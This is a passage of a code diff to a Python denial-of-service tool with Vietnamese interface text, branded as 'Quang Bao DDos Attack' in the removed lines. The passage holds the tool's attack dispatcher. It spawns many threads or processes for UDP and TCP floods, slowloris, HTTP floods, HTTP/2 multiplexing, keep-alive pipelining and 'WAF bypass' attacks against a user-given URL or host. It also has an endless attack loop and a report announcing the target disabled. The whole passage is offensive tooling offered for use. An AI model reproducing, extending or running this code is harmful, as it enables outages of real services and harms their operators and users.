+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=multi_vector_attack, args=(validated_url, REQUESTS_PER_THREAD))
+                    threads.append(t)
+                    t.start()
+                try:
+                    for t in threads:
+                        t.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công đa vector bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "layer7":
+                threads = []
+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=layer7_waf_bypass_attack, args=(validated_url, REQUESTS_PER_THREAD))
+                    threads.append(t)
+                    t.start()
+                try:
+                    for t in threads:
+                        t.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công tầng 7 bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "http2":
+                if not HTTP2_AVAILABLE:
+                    console.print("[error][LỖI] Tấn công HTTP/2 bị vô hiệu hóa: Chưa cài đặt module 'h2'[/]")
+                    time.sleep(1)
+                    continue
+                threads = []
+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=http2_multiplexing_attack, args=(validated_url,))
+                    threads.append(t)
+                    t.start()
+                try:
+                    for t in threads:
+                        t.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công HTTP/2 bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "keep_alive":
+                threads = []
+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=keep_alive_pipelining_attack, args=(validated_url,))
+                    threads.append(t)
+                    t.start()
+                try:
+                    for t in threads:
+                        t.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công keep-alive bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "multi_proc":
+                processes = []
+                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):
+                    p = multiprocessing.Process(target=multiprocessing_attack, args=(validated_url, REQUESTS_PER_THREAD))
+                    p.daemon = True
+                    processes.append(p)
+                    p.start()
+                try:
+                    for p in processes:
+                        p.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công đa tiến trình bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "multi_async":
+                processes = []
+                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):
+                    p = multiprocessing.Process(target=multiprocessing_async_wrapper, args=(validated_url, REQUESTS_PER_THREAD))
+                    p.daemon = True
+                    processes.append(p)
+                    p.start()
+                try:
+                    for p in processes:
+                        p.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công đa tiến trình + bất đồng bộ bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "udp_flood":
+                threads = []
+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=udp_flood_attack, args=(host, port))
+                    threads.append(t)
+                    t.start()
+                try:
+                    for t in threads:
+                        t.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công UDP flood bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "waf_bypass":
+                threads = []
+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=layer7_waf_bypass_attack, args=(validated_url,))
+                    threads.append(t)
+                    t.start()
+                try:
+                    for t in threads:
+                        t.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công vượt WAF bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "tcp_udp":
+                threads = []
+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=layer4_tcp_udp_flood, args=(host, port))
+                    threads.append(t)
+                    t.start()
+                try:
+                    for t in threads:
+                        t.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công TCP/UDP bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "ultimate_x":
+                if attack_choice == "1":
+                    threads = []
+                    for _ in range(NUM_THREADS):
+                        t = threading.Thread(target=udp_flood_attack, args=(host, port))
+                        threads.append(t)
+                        t.start()
+                    try:
+                        for t in threads:
+                            t.join()
+                    except KeyboardInterrupt:
+                        console.print("[warning][HỆ THỐNG] Tấn công băng thông bị dừng bởi người dùng[/]")
+                        exit(0)
+                elif attack_choice == "2":
+                    threads = []
+                    for _ in range(NUM_THREADS):
+                        t = threading.Thread(target=layer4_tcp_udp_flood, args=(host, port))
+                        threads.append(t)
+                        t.start()
+                    try:
+                        for t in threads:
+                            t.join()
+                    except KeyboardInterrupt:
+                        console.print("[warning][HỆ THỐNG] Tấn công giao thức bị dừng bởi người dùng[/]")
+                        exit(0)
+                else:
+                    threads = []
+                    for _ in range(NUM_THREADS):
+                        t = threading.Thread(target=layer7_waf_bypass_attack, args=(validated_url,))
+                        threads.append(t)
+                        t.start()
+                    try:
+                        for t in threads:
+                            t.join()
+                    except KeyboardInterrupt:
+                        console.print("[warning][HỆ THỐNG] Tấn công tầng ứng dụng bị dừng bởi người dùng[/]")
+                        exit(0)
+            else:
+                while True:
+                    slowloris_thread = threading.Thread(target=slowloris_attack, args=(validated_url, 30))
+                    flood_thread = threading.Thread(target=http_flood_attack, args=(validated_url, NUM_THREADS * 2))
+                    slowloris_thread.start()
+                    flood_thread.start()
 
-            total_time = time.time() - start_time
-            avg_response_time = sum(response_times) / len(response_times) if response_times else 0
-            max_response_time = max(response_times) if response_times else 0
-            min_response_time = min(response_times) if response_times else 0
-            rps = (success_count + error_count) / total_time if total_time > 0 else 0
-            success_rate = (success_count / max(1, success_count + error_count)) * 100
-            error_rate = (error_count / max(1, success_count + error_count)) * 100
-            waf_bypass_rate = (waf_bypass_count / max(1, success_count)) * 100
+                    threads = []
+                    for _ in range(NUM_THREADS):
+                        t = threading.Thread(target=send_request, args=(validated_url, REQUESTS_PER_THREAD))
+                        threads.append(t)
+                        t.start()
 
-            # Generate RPS chart with provided data
-            if rps_data:
-                chart_data = [
-                    {"x": 1.0, "y": 100.5},
-                    {"x": 2.0, "y": 150.2},
-                    {"x": 3.0, "y": 203.9},
-                    {"x": 4.3, "y": 189.8},
-                    {"x": 4.0, "y": 205.7},
-                    {"x": 3.5, "y": 232.4},
-                    {"x": 4.3, "y": 191.4},
-                    {"x": 14.8, "y": 55.3}
-                ]
-                chart_config = {
-                    "type": "line",
-                    "data": {
-                        "datasets": [{
-                            "label": "RPS theo thời gian",
-                            "data": chart_data,
-                            "borderColor": "#ff00ff",
-                            "backgroundColor": "rgba(255, 0, 255, 0.2)",
-                            "fill": True,
-                            "tension": 0.4
-                        }]
-                    },
-                    "options": {
-                        "scales": {
-                            "x": {
-                                "type": "linear",
-                                "title": {"display": True, "text": "Thời gian (giây)", "color": "#ffffff"},
-                                "ticks": {"color": "#ffffff"}
-                            },
-                            "y": {
-                                "title": {"display": True, "text": "RPS", "color": "#ffffff"},
-                                "ticks": {"color": "#ffffff"},
-                                "beginAtZero": True
-                            }
-                        },
-                        "plugins": {
-                            "title": {
-                                "display": True,
-                                "text": "Biểu đồ RPS Tấn công",
-                                "color": "#ffffff",
-                                "font": {"size": 16}
-                            },
-                            "legend": {
-                                "labels": {"color": "#ffffff"}
-                            }
-                        }
-                    }
-                }
-                console.print("\n[bold magenta]Biểu đồ RPS:[/]")
-                console.print(f"```chartjs\n{json.dumps(chart_config, indent=2, ensure_ascii=False)}\n```")
+                    for t in threads:
+                        t.join()
+
+                    slowloris_thread.join()
+                    flood_thread.join()
+
+                    console.print("[warning][HỆ THỐNG] Chu kỳ tấn công vô hạn: Tiếp tục...[/]")
+                    time.sleep(1)
+
+            end_time = time.time()
+            total_time = end_time - start_time
+
+            with manager:
+                if response_times:
+                    avg_response_time = sum(response_times) / len(response_times)
+                    max_response_time = max(response_times)
+                    min_response_time = min(response_times)
+                else:
+                    avg_response_time = 0
+                    max_response_time = 0
+                    min_response_time = 0
 
             report = Panel(
-                f"[bold {theme_color}]Tổng lượt:[/] [bold green]{num_threads * requests_per_thread:,}[/]\n"
-                f"[bold {theme_color}]Thành công:[/] [bold green]{success_count:,} ({success_rate:.1f}%)[/] [✓][/] \n"
-                f"[bold {theme_color}]Thất bại:[/] [bold red]{error_count:,} ({error_rate:.1f}%)[/] [✗][/] \n"
-                f"[bold {theme_color}]WAF Bypass:[/] [bold cyan]{waf_bypass_count:,} ({waf_bypass_rate:.1f}%)[/] [★][/] \n"
-                f"[bold {theme_color}]Proxy lỗi:[/] [bold red]{proxy_error_count:,}[/]\n"
-                f"[bold {theme_color}]Thời gian:[/] [bold green]{total_time:.2f}[/] giây\n"
-                f"[bold {theme_color}]Ping TB:[/] [bold green]{avg_response_time:.2f}[/]ms\n"
-                f"[bold {theme_color}]Ping Max:[/] [bold green]{max_response_time:.2f}[/]ms\n"
-                f"[bold {theme_color}]Ping Min:[/] [bold green]{min_response_time:.2f}[/]ms\n"
-                f"[bold {theme_color}]RPS:[/] [bold green]{rps:.0f}[/]\n"
-                f"[bold {theme_color}]Proxy:[/] [bold green]{len(PROXY_LIST)}[/]\n"
-                f"[yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
-                title=f"[bold {theme_color}]BÁO CÁO TẤN CÔNG SIÊU CẤP[/]",
-                border_style="bold cyan",
-                padding=(1, 2)
+                f"""
+[+] BÁO CÁO CHIẾN DỊCH: {target['name'].upper()}
+[+] Tổng lượt đánh: {(NUM_THREADS * REQUESTS_PER_THREAD):,}
+[+] Thành công: {success_count:,} ({success_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%)
+[+] Thất bại: {error_count:,} ({error_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%)
+[+] Tổng thời gian: {total_time:.2f} giây
+[+] Thời gian phản hồi trung bình: {avg_response_time:.2f}ms
+[+] Hiệu suất đỉnh: {max_response_time:.2f}ms
+[+] Độ trễ tối thiểu: {min_response_time:.2f}ms
+[+] Lượt đánh/giây: {(NUM_THREADS * REQUESTS_PER_THREAD)/total_time:.0f}
+[+] MỤC TIÊU BỊ VÔ HIỆU HÓA!
+                """,
+                title="BÁO CÁO TẤN CÔNG",
+                style="success"
             )
-            console.print("")
             console.print(report)
-            console.print(f"[success]Báo cáo hoàn tất! [✓][/] [yellow]*VORTEX*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
 
         except KeyboardInterrupt:
-            console.print(f"[warning]Tấn công bị dừng [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-            display_exit_banner(theme_color)
+            console.print("[warning][HỆ THỐNG] Tấn công bị dừng bởi người dùng[/]")
             exit(0)
         except Exception as e:
-            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-            console.print(f"[error]Lỗi hệ thống: [red]{error_msg}[/] [✗][/] [yellow]*ALERT*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-            time.sleep(1)
-            continue
+            console.print(f"[error][HỆ THỐNG] Lỗi nghiêm trọng: {str(e)}[/]")
+            exit(1)
 
 if __name__ == "__main__":
     main()
